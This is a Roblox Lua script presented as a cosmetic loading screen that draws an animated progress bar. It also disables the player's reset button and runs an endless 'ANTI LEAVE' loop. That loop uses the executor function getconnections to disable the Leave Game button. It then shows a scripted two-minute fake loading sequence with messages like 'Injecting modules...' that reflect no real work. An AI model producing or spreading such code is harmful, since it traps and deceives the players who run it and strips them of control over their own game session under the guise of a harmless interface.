--// MINIMAL KNOX LOADING SCREEN
--// Put in StarterGui as LocalScript

local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

--// DISABLE RESET
pcall(function()
	StarterGui:SetCore("ResetButtonCallback", false)
end)

--// ANTI LEAVE
task.spawn(function() 
	while task.wait() do 
		pcall(function() 
			for _,v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do 
				v:Disable() 
			end 
		end) 
	end 
end)

--// GUI SETUP
local gui = Instance.new("ScreenGui")
gui.Name = "KNOX_LOADING"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.Parent = playerGui

local bg = Instance.new("Frame")
bg.Size = UDim2.new(1,0,1,0)
bg.BackgroundColor3 = Color3.fromRGB(0,0,0)
bg.BackgroundTransparency = 0.35
bg.Parent = gui

local main = Instance.new("Frame")
main.Size = UDim2.new(0, 360, 0, 150)
main.Position = UDim2.new(0.5, -180, 0.5, -75)
main.BackgroundColor3 = Color3.fromRGB(8,8,8)
main.BorderSizePixel = 0
main.Parent = bg

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0,22)
corner.Parent = main

local stroke = Instance.new("UIStroke")
stroke.Thickness = 1.4
stroke.Transparency = 0.45
stroke.Color = Color3.fromRGB(255,255,255)
stroke.Parent = main

local gradient = Instance.new("UIGradient")
gradient.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(15,15,15)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(5,5,5))
}
gradient.Rotation = 90
gradient.Parent = main

--// STATUS
local status = Instance.new("TextLabel")
status.Size = UDim2.new(1,0,0,30)
status.Position = UDim2.new(0,0,0.28,0)
status.BackgroundTransparency = 1
status.Text = "Connecting..."
status.Font = Enum.Font.GothamSemibold
status.TextSize = 18
status.TextColor3 = Color3.fromRGB(220,220,220)
status.Parent = main

--// BAR BACKGROUND
local barBG = Instance.new("Frame")
barBG.Size = UDim2.new(0.72,0,0,12)
barBG.Position = UDim2.new(0.14,0,0.55,0)
barBG.BackgroundColor3 = Color3.fromRGB(20,20,20)
barBG.BorderSizePixel = 0
barBG.Parent = main

local barBGCorner = Instance.new("UICorner")
barBGCorner.CornerRadius = UDim.new(1,0)
barBGCorner.Parent = barBG

--// BAR
local bar = Instance.new("Frame")
bar.Size = UDim2.new(0,0,1,0)
bar.BackgroundColor3 = Color3.fromRGB(255,255,255)
bar.BorderSizePixel = 0
bar.Parent = barBG

local barCorner = Instance.new("UICorner")
barCorner.CornerRadius = UDim.new(1,0)
barCorner.Parent = bar

local glow = Instance.new("UIStroke")
glow.Thickness = 2
glow.Color = Color3.fromRGB(255,255,255)
glow.Transparency = 0.25
glow.Parent = bar

--// PERCENT
local percent = Instance.new("TextLabel")
percent.Size = UDim2.new(1,0,0,20)
percent.Position = UDim2.new(0,0,0.7,0)
percent.BackgroundTransparency = 1
percent.Text = "0%"
percent.Font = Enum.Font.GothamBold
percent.TextSize = 16
percent.TextColor3 = Color3.fromRGB(255,255,255)
percent.Parent = main

--// FLOAT EFFECT
task.spawn(function()
	while gui.Parent do
		local up = TweenService:Create(
			main,
			TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
			{Position = UDim2.new(0.5,-180,0.5,-79)}
		)

		local down = TweenService:Create(
			main,
			TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
			{Position = UDim2.new(0.5,-180,0.5,-71)}
		)

		up:Play()
		up.Completed:Wait()

		down:Play()
		down.Completed:Wait()
	end
end)

--// REALISTIC 2 MINUTE LOADING
local totalTime = 120
local steps = 100
local baseDelay = totalTime / steps

for i = 1,100 do
	bar:TweenSize(
		UDim2.new(i/100,0,1,0),
		Enum.EasingDirection.Out,
		Enum.EasingStyle.Quint,
		baseDelay,
		true
	)

	percent.Text = i.."%"

	local jitter = math.random(1,10)

	if i < 10 then
		status.Text = "Booting system core..."
		task.wait(baseDelay + 0.3)

	elseif i < 25 then
		status.Text = "Connecting..."
		task.wait(baseDelay + (jitter * 0.01))

	elseif i < 45 then
		status.Text = "Loading assets..."
		task.wait(baseDelay + 0.2)

	elseif i < 65 then
		status.Text = "Verifying integrity..."
		task.wait(baseDelay)

	elseif i < 80 then
		status.Text = "Injecting modules..."
		task.wait(baseDelay + 0.15)

	elseif i < 95 then
		status.Text = "Optimizing performance..."
		task.wait(baseDelay + 0.25)

	else
		status.Text = "Launching..."
		task.wait(baseDelay + 0.4)
	end
end

task.wait(1)

--// FADE OUT
for _,v in pairs(gui:GetDescendants()) do
	if v:IsA("Frame") then
		TweenService:Create(v, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
	elseif v:IsA("TextLabel") then
		TweenService:Create(v, TweenInfo.new(1), {TextTransparency = 1}):Play()
	elseif v:IsA("UIStroke") then
		TweenService:Create(v, TweenInfo.new(1), {Transparency = 1}):Play()
	end
end

task.wait(1.2)
gui:Destroy()
